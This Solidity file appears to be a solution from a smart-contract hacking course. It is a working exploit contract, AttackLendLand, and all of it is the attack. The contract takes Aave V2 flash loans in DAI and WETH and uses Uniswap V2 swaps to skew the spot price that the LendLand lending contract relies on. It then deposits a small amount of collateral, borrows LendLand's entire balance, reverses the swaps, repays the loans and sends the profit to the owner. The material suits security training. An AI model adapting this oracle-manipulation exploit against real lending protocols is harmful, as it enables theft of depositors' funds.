// SCH Course Copyright Policy (C): DO-NOT-SHARE-WITH-ANYONE
// https://smartcontractshacking.com/#copyright-policy
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {IUniswapV2Pair} from "../interfaces/IUniswapV2.sol";
import {LendLand} from "./LendLand.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "../interfaces/ILendingPool.sol";
import "../interfaces/IUniswapV2.sol";
import "forge-std/console.sol";

contract AttackLendLand is Ownable {
    LendLand private immutable lendLand;
    ILendingPool private immutable aavePool;
    IUniswapV2Pair private immutable pair;
    IUniswapV2Router01 public immutable uniswapV2Router;

    address private immutable aWETH;
    address private immutable aDAI;

    IERC20 private immutable WETH;
    IERC20 private immutable DAI;

    uint256 private reserve0;
    uint256 private reserve1;

    constructor(address _pair, address _lendLand, address _pool, address _router, address _aWeth, address _aDai) {
        pair = IUniswapV2Pair(_pair);
        lendLand = LendLand(_lendLand);
        aavePool = ILendingPool(_pool);
        uniswapV2Router = IUniswapV2Router02(_router);
        aWETH = _aWeth;
        aDAI = _aDai;

        DAI = IERC20(pair.token0()); // DAI
        WETH = IERC20(pair.token1()); // WETH
    }

    function attack() external onlyOwner {
        console.log("~~~~~~Starting Attack~~~~~~");

        // Determine AAVE Liquidity
        uint256 daiLiquidity = DAI.balanceOf(aDAI);
        uint256 wethLiquidity = WETH.balanceOf(aWETH);
        console.log("Available DAI liquidity in AAVE V2 aDAI contract: ", daiLiquidity);
        console.log("Available WETH liquidity in AAVE V2 aWETH contract: ", wethLiquidity);

        // Initiate DAI Flash loan
        _getFlashLoan(address(DAI), daiLiquidity);

        // Initiate WETH Flash loan
        // we don't need to take all liquidity because we pay unneccesary fees to AAVE
        _getFlashLoan(address(WETH), wethLiquidity / 9);

        console.log("~~~~~~Ending Attack~~~~~~");
    }

    function _getFlashLoan(address token, uint256 amount) internal {
        address[] memory assets = new address[](1);
        assets[0] = token;

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = amount;

        uint256[] memory modes = new uint256[](1);
        modes[0] = 0;

        aavePool.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);
        _withdrawProfit();
    }

    function executeOperation(
        address[] memory assets,
        uint256[] memory amounts,
        uint256[] memory premiums,
        address initiator,
        bytes memory
    ) public returns (bool) {
        require(msg.sender == address(aavePool), "Unauthorized");
        require(initiator == address(this), "Who started this flash loan?");

        _fetchReserves();

        IERC20 token;
        uint256 minAmountOut;
        address[] memory path = new address[](2);
        uint256 wethBalance;
        uint256 daiBalance;

        for (uint256 i = 0; i < assets.length; i++) {
            token = IERC20(assets[i]);

            // DAI Flash loan case
            if (token == DAI) {
                console.log("~~~~~~ DAI Flashloan Start ~~~~~~");
                console.log("DAI Received From Flash Loan: ", amounts[i]);

                // Sell out flash loaned DAI to WETH
                path[0] = address(DAI);
                path[1] = address(WETH);
                minAmountOut = uniswapV2Router.getAmountOut(amounts[i], reserve0, reserve1);

                DAI.approve(address(uniswapV2Router), amounts[i]);
                uniswapV2Router.swapExactTokensForTokens(amounts[i], minAmountOut, path, address(this), block.timestamp);

                wethBalance = WETH.balanceOf(address(this)); // we got WETH from the swap
                console.log("WETH Balance after swap: ", wethBalance);

                _fetchReserves();

                // Deposit %0.24 of our WETH, it will calculate our allowance to the Dai balance of LendLand
                uint256 wethToDeposit = wethBalance * 24 / 10000;
                console.log("wethToDeposit: ", wethToDeposit);

                WETH.approve(address(lendLand), wethToDeposit);
                lendLand.deposit(address(WETH), wethToDeposit);

                uint256 wantedDaiBalance = DAI.balanceOf(address(lendLand));
                console.log("Want to borrow DAI", wantedDaiBalance);

                // Try to borrow all DAI balance
                lendLand.borrow(address(DAI), wantedDaiBalance);

                // Swap back from WETH to DAI
                wethBalance = WETH.balanceOf(address(this));
                minAmountOut = uniswapV2Router.getAmountOut(wethBalance, reserve1, reserve0);
                path[0] = address(WETH);
                path[1] = address(DAI);

                WETH.approve(address(uniswapV2Router), wethBalance);
                uniswapV2Router.swapExactTokensForTokens(
                    wethBalance, minAmountOut, path, address(this), block.timestamp
                );

                daiBalance = DAI.balanceOf(address(this));
                console.log("DAI Balance: ", daiBalance);

                console.log("~~~~~~ DAI Flashloan End ~~~~~~");
            } else {
                console.log("~~~~~~ WETH Flashloan Start ~~~~~~");
                console.log("WETH Received From Flash Loan: ", amounts[i]);

                // Sell out flash loaned DAI to WETH
                path[0] = address(WETH);
                path[1] = address(DAI);
                minAmountOut = uniswapV2Router.getAmountOut(amounts[i], reserve1, reserve0);

                WETH.approve(address(uniswapV2Router), amounts[i]);
                uniswapV2Router.swapExactTokensForTokens(amounts[i], minAmountOut, path, address(this), block.timestamp);

                daiBalance = DAI.balanceOf(address(this)); // we got DAI from the swap
                console.log("DAI Balance after swap: ", daiBalance);

                _fetchReserves();

                // Deposit %0.27 of our DAI, it will calculate our allowance to the Weth balance of LendLand
                uint256 daiToDeposit = daiBalance * 27 / 10000;
                console.log("daiToDeposit: ", daiToDeposit);

                DAI.approve(address(lendLand), daiToDeposit);
                lendLand.deposit(address(DAI), daiToDeposit);

                uint256 wantedWethBalance = WETH.balanceOf(address(lendLand));
                console.log("Want to borrow WETH", wantedWethBalance);

                // Try to borrow all WETH balance
                lendLand.borrow(address(WETH), wantedWethBalance);

                // Swap back from DAI to WETH
                daiBalance = DAI.balanceOf(address(this));
                minAmountOut = uniswapV2Router.getAmountOut(daiBalance, reserve0, reserve1);
                path[0] = address(DAI);
                path[1] = address(WETH);

                DAI.approve(address(uniswapV2Router), daiBalance);
                uniswapV2Router.swapExactTokensForTokens(daiBalance, minAmountOut, path, address(this), block.timestamp);

                wethBalance = WETH.balanceOf(address(this));
                console.log("WETH Balance: ", wethBalance);

                console.log("~~~~~~ WETH Flashloan End ~~~~~~");
            }
            uint256 owed = amounts[i] + premiums[i];
            token.approve(address(aavePool), owed);
        }

        return true;
    }

    function _withdrawProfit() internal {
        DAI.transfer(owner(), DAI.balanceOf(address(this)));
        WETH.transfer(owner(), WETH.balanceOf(address(this)));
    }

    function _fetchReserves() internal {
        (reserve0, reserve1,) = pair.getReserves();
        console.log("reserve0 :", reserve0);
        console.log("reserve1 :", reserve1);
        console.log("ETH price :", reserve0 / reserve1);
    }
}
